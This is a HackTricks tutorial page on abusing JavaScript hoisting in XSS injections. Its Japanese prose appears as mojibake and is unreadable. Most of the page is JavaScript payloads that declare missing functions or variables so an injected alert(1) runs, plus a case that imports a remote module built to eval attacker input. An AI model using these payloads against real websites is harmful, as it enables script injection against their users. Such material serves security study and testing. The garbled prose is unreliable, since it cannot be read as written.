# JS Hoisting

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

ä»–ã®HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## åŸºæœ¬æƒ…å ±

{% hint style="success" %}
JavaScript Hoistingã¯ã€é–¢æ•°ã€å¤‰æ•°ã€ã‚¯ãƒ©ã‚¹ã€ã¾ãŸã¯ã‚¤ãƒ³ãƒãƒ¼ãƒˆã®**å®£è¨€ãŒã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œå‰ã«ãã®ã‚¹ã‚³ãƒ¼ãƒ—ã®å…ˆé ­ã«ç§»å‹•ã™ã‚‹ã‚ˆã†ã«è¦‹ãˆã‚‹**ãƒ—ãƒ­ã‚»ã‚¹ã‚’æŒ‡ã—ã¾ã™ã€‚
{% endhint %}

JavaScriptã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€ä»»æ„ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«å¯¾ã—ã¦ï¼ˆå°‘ãªãã¨ã‚‚2å›ã®ï¼‰ãƒ‘ã‚¹ã‚’è¡Œã„ã¾ã™ã€‚ã“ã‚Œã¯å¤§ããªå˜ç´”åŒ–ã§ã™ãŒã€JSã®å®Ÿè¡Œã¯2ã¤ã®ã‚¹ãƒ†ãƒƒãƒ—ã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹ã¨è€ƒãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ã¾ãšã€ã‚³ãƒ¼ãƒ‰ãŒè§£æã•ã‚Œ**ã€ã“ã‚Œã«ã¯**æ§‹æ–‡ã‚¨ãƒ©ãƒ¼**ã®ãƒã‚§ãƒƒã‚¯ã¨æŠ½è±¡æ§‹æ–‡æœ¨ã¸ã®å¤‰æ›ãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã«ã¯ã€ç‰¹å®šã®å½¢å¼ã®å®£è¨€ãŒå®Ÿè¡Œã‚¹ã‚¿ãƒƒã‚¯ã®å…ˆé ­ã«ã€Œç§»å‹•ã€ï¼ˆãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ï¼‰ã•ã‚Œã‚‹ã¨èª¬æ˜ã•ã‚Œã‚‹**ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ã‚‚å«ã¾ã‚Œã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ãŒè§£æã‚¹ãƒ†ãƒƒãƒ—ã‚’é€šéã™ã‚‹ã¨ã€ã‚¨ãƒ³ã‚¸ãƒ³ã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®**å®Ÿè¡Œã‚’ç¶šã‘ã¾ã™**ã€‚

1. ï¼ˆæ³¨å…¥ã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ï¼‰ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã¯æ§‹æ–‡è¦å‰‡ã«å¾“ã‚ãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚**æœ€çµ‚ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ã©ã“ã‹ã§æ§‹æ–‡ãŒç„¡åŠ¹ã§ã‚ã‚Œã°ã€ä½•ã‚‚å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ã€‚
2. ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã®ã‚³ãƒ¼ãƒ‰ãŒé…ç½®ã•ã‚Œã‚‹å ´æ‰€ã¯é‡è¦ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã®ãƒ†ã‚­ã‚¹ãƒˆè¡¨ç¾ã¯ã€æœ€çµ‚çš„ã«ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‚‚ã®ã¨åŒã˜ã§ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚ä»»æ„ã®è¨€èªã«ã¯ã€å¼ãŒå®Ÿè¡Œã•ã‚Œã‚‹é †åºã‚’æ±ºå®šã™ã‚‹è¦å‰‡ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

### ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®4ã¤ã®ã‚¿ã‚¤ãƒ—

MDNã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®èª¬æ˜ã«æˆ»ã‚‹ã¨ã€JavaScriptã«ã¯4ç¨®é¡ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ãŒã‚ã‚‹ã¨èª­ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚MDNã‹ã‚‰ç›´æ¥å¼•ç”¨ã—ã¾ã™ï¼š

> 1. å®£è¨€ã•ã‚Œã‚‹è¡Œã‚ˆã‚Šå‰ã®ã‚¹ã‚³ãƒ¼ãƒ—ã§å¤‰æ•°ã®å€¤ã‚’ä½¿ç”¨ã§ãã‚‹ã“ã¨ã€‚ï¼ˆã€Œå€¤ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã€ï¼‰
> 2. å®£è¨€ã•ã‚Œã‚‹è¡Œã‚ˆã‚Šå‰ã®ã‚¹ã‚³ãƒ¼ãƒ—ã§å¤‰æ•°ã‚’å‚ç…§ã§ãã‚‹ãŒã€`ReferenceError`ã‚’æŠ•ã’ãšã«ã€å€¤ã¯å¸¸ã«`undefined`ã§ã‚ã‚‹ã€‚ï¼ˆã€Œå®£è¨€ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã€ï¼‰
> 3. å¤‰æ•°ã®å®£è¨€ãŒã€ãã‚ŒãŒå®£è¨€ã•ã‚Œã‚‹è¡Œã‚ˆã‚Šå‰ã®ã‚¹ã‚³ãƒ¼ãƒ—ã§ã®å‹•ä½œå¤‰æ›´ã‚’å¼•ãèµ·ã“ã™ã€‚
> 4. å®£è¨€ã®å‰¯ä½œç”¨ãŒã€ãã‚Œã‚’å«ã‚€ã‚³ãƒ¼ãƒ‰ã®æ®‹ã‚Šã®è©•ä¾¡å‰ã«ç”Ÿã˜ã‚‹ã€‚

ç¶šã„ã¦

> ä¸Šè¨˜ã®4ã¤ã®é–¢æ•°å®£è¨€ã¯ã‚¿ã‚¤ãƒ—1ã®å‹•ä½œã§ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã¾ã™ï¼›`var`å®£è¨€ã¯ã‚¿ã‚¤ãƒ—2ã®å‹•ä½œã§ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã¾ã™ï¼›[`let`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let)ã€[`const`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const)ã€ãŠã‚ˆã³[`class`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/class)å®£è¨€ï¼ˆãƒ¬ã‚­ã‚·ã‚«ãƒ«å®£è¨€ã¨ã‚‚å‘¼ã°ã‚Œã¾ã™ï¼‰ã¯ã‚¿ã‚¤ãƒ—3ã®å‹•ä½œã§ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã¾ã™ï¼›[`import`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import)å®£è¨€ã¯ã‚¿ã‚¤ãƒ—1ãŠã‚ˆã³ã‚¿ã‚¤ãƒ—4ã®å‹•ä½œã§ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚

## ã‚·ãƒŠãƒªã‚ª

ã—ãŸãŒã£ã¦ã€å®£è¨€ã•ã‚Œã¦ã„ãªã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½¿ç”¨ã•ã‚ŒãŸå¾Œã«JSã‚³ãƒ¼ãƒ‰ã‚’**æ³¨å…¥ã§ãã‚‹ã‚·ãƒŠãƒªã‚ª**ãŒã‚ã‚‹å ´åˆã€ãã‚Œã‚’å®£è¨€ã™ã‚‹ã“ã¨ã§æ§‹æ–‡ã‚’**ä¿®æ­£**ã§ãã¾ã™ï¼ˆã‚¨ãƒ©ãƒ¼ã‚’æŠ•ã’ã‚‹ä»£ã‚ã‚Šã«ã‚ãªãŸã®ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ï¼‰ã€‚
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## ã•ã‚‰ãªã‚‹ã‚·ãƒŠãƒªã‚ª
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## å‚è€ƒæ–‡çŒ®

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
